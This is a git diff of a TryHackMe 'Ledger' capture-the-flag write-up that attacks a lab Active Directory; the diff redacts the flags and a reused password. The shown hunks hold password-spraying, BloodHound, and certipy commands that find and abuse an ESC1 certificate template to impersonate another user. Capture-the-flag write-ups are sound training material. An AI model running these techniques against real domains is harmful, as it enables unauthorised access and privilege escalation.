@@ -1,13 +1,10 @@
-<p align="center">May 6, 2025<br>
-Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
-It´s part of my $$\textcolor{#FF69B4}{\textbf{366}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
-<img width="300px" src="" alt="Your Image Badge"><br>
-<img width="200px" src="https://github.com/user-attachments/assets/730584a5-e81b-4a5e-9cb5-b888b92e5705" alt="streak"><br></p>
-<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Ledger}}$$</h1>
-<p align="center"><em>This challenge simulates a real cyber-attack scenario where you must exploit an Active Directory.</em>!<br>
-It is classified as a hard-level CTF.<br>
-It is premium: only for subscribers.<br>
-Can be accessed clicking  <a href="https://tryhackme.com/room/ledger">here</a>.</p>
+<h1 align="center">Ledger</h1>
+<p align="center">2025, August 2<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>453</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
+<em>This challenge simulates a real cyber-attack scenario where you must exploit an Active Directory.</em>.<br>
+<img width="80px" src="https://github.com/user-attachments/assets/6fa49113-acb7-44aa-993e-f3b3e6ba5206"><br>
+Click <a href="https://tryhackme.com/room/ledger">here </a>to access this TryHackMe CTF.<br>
+<img width="1200px" src="https://github.com/user-attachments/assets/ece47b2d-4a71-42d9-902e-42e6f3b86948"></p>
+
 
 <p align="center"> <img width="1000px" src=""> </p>
 
@@ -26,13 +23,13 @@ Note: The VM takes about 5 minutes to fully boot up. All the necessary tools are
 
 
 > 1.1. <em>What is the user flag? </em><br><a id='1.1'></a>
->> <strong><code>___________________________</code></strong><br>
+>> <strong><code>Redacted</code></strong><br>
 <p></p>
 
 <br>
 
 > 1.2. <em>What is the root flag? </em><br><a id='1.2'></a>
->> <strong><code>___________________________</code></strong><br>
+>> <strong><code>Redacted</code></strong><br>
 <p></p>
 
 
@@ -209,7 +206,7 @@ PING labyrinth.thm.local (TargetIP) 56(84) bytes of data.
 
 <br>
 
-<h3>Gobuster</h3>
+<h3>gobuster</h3>
 
 ```bash
 :~/Ledger# gobuster dir -u http://labyrinth.thm.local -w /usr/share/wordlists/dirb/common.txt
@@ -317,7 +314,7 @@ smb: \> exit
 
 <br>
 
-<h3><code>crackmapexec</code></h3>
+<h3>crackmapexec</h3>
 
 ```bash
 :~/Ledger# crackmapexec smb TargetIP -u 'guest' -p ''
@@ -362,27 +359,27 @@ SMB         TargetIP    445    LABYRINTH        1150: THM\ROB_SALAZAR (SidTypeUs
 SMB         TargetIP    445    LABYRINTH        1151: THM\RITA_HOWE (SidTypeUser)
 SMB         TargetIP    445    LABYRINTH        1152: THM\LETITIA_BERG (SidTypeUser)
 SMB         TargetIP    445    LABYRINTH        1153: THM\CECILE_PATRICK (SidTypeUser)
-SMB         10.201.45.33    445    LABYRINTH        1154: THM\PRINCE_HOFFMAN (SidTypeUser)
-SMB         10.201.45.33    445    LABYRINTH        1155: THM\KURT_GILMORE (SidTypeUser)
-SMB         10.201.45.33    445    LABYRINTH        1156: THM\JASPER_GARDNER (SidTypeUser)
-SMB         10.201.45.33    445    LABYRINTH        1157: THM\YVONNE_NEWTON (SidTypeUser)
-SMB         10.201.45.33    445    LABYRINTH        1158: THM\SHELLEY_BEARD (SidTypeUser)
-SMB         10.201.45.33    445    LABYRINTH        1159: THM\SILAS_WALLS (SidTypeUser)
-SMB         10.201.45.33    445    LABYRINTH        1160: THM\AMOS_MCPHERSON (SidTypeUser)
+SMB         TargetIP    445    LABYRINTH        1154: THM\PRINCE_HOFFMAN (SidTypeUser)
+SMB         TargetIP    445    LABYRINTH        1155: THM\KURT_GILMORE (SidTypeUser)
+SMB         TargetIP    445    LABYRINTH        1156: THM\JASPER_GARDNER (SidTypeUser)
+SMB         TargetIP    445    LABYRINTH        1157: THM\YVONNE_NEWTON (SidTypeUser)
+SMB         TargetIP    445    LABYRINTH        1158: THM\SHELLEY_BEARD (SidTypeUser)
+SMB         TargetIP    445    LABYRINTH        1159: THM\SILAS_WALLS (SidTypeUser)
+SMB         TargetIP    445    LABYRINTH        1160: THM\AMOS_MCPHERSON (SidTypeUser)
 ...
 ```
 
 
 ```bash
-:~/Ledger# nxc smb ledger.thm -u usernames.txt -p 'CHANGEME2023!' --continue-on-success
+:~/Ledger# nxc smb ledger.thm -u usernames.txt -p 'Cxxxxxxxxx23!' --continue-on-success
 SMB         TargetIP    445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False) 
-SMB         TargetIP    445    LABYRINTH        [+] thm.local\IVY_WILLIS:CHANGEME2023! 
-SMB         TargetIP    445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023!
+SMB         TargetIP    445    LABYRINTH        [+] thm.local\IVY_WILLIS:Cxxxxxxxxx23! 
+SMB         TargetIP    445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:Cxxxxxxxxx23!
 ```
 
 
 ```bash
-:~/Ledger# bloodhound-python -d thm.local -c All -u 'IVY_WILLIS' -p 'CHANGEME2023!' -ns TargetIP --dns-tcp
+:~/Ledger# bloodhound-python -d thm.local -c All -u 'IVY_WILLIS' -p 'Cxxxxxxxxx23!' -ns TargetIP --dns-tcp
 NFO: Found AD domain: thm.local
 INFO: Getting TGT for user
 INFO: Connecting to LDAP server: labyrinth.thm.local
@@ -406,7 +403,7 @@ INFO: Done in 00M 05S
 <p>
 
 - SUSANNA_MCKNIGHT<br>
-- CHANGEME2023!<br>
+- Cxxxxxxxxx23!<br>
 - thm.local
 </p>
 
@@ -438,7 +435,7 @@ TargetIP    ledger.thm labyrinth.thm.local thm.local LABYRINTH thm-LABYRINTH-CA
 <h3>certipy</h3>
 
 ```bash
-(venv) :~/Ledger#  certipy find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -target labyrinth.thm.local -stdout -vulnerable
+(venv) :~/Ledger#  certipy find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'Cxxxxxxxxx23!' -target labyrinth.thm.local -stdout -vulnerable
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Finding certificate templates
@@ -553,12 +550,11 @@ Certificate Templates
                                           THM.LOCAL\Administrator
     [!] Vulnerabilities
       ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
-...
 ```
 
 
 ```bash
-(venv) :~/Ledger#  certipy req -u 'Susanna_McKnight@thm.local' -p 'CHANGEME2023!' -dc-ip 'TargetIP' -target 'labyrinth.thm.local' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'Bradley_Ortiz@thm.local'
+(venv) :~/Ledger#  certipy req -u 'Susanna_McKnight@thm.local' -p 'Cxxxxxxxxx23!' -dc-ip 'TargetIP' -target 'labyrinth.thm.local' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'Bradley_Ortiz@thm.local'
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
